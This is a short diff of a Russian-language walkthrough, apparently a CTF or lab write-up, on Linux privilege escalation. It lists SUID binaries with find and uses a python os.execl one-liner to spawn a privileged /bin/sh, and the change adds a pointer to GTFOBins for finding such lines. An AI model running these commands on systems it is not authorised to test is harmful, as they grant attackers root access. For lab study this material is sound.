@@ -153,7 +153,8 @@ find / -type f -user root -perm -4000 2>/dev/null
 or
 find / -perm -u=s -type f 2>/dev/null
 ```
-т.к. есть возможность запускать python, этим мы и воспользуемся:
+т.к. есть возможность запускать python, этим мы и воспользуемся, для того что бы подобрать команду можно 
+перейти на https://gtfobins.github.io/ и в соответсвующем разделе python - SUID найти нужную строку:
 ```commandline
 python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
 id
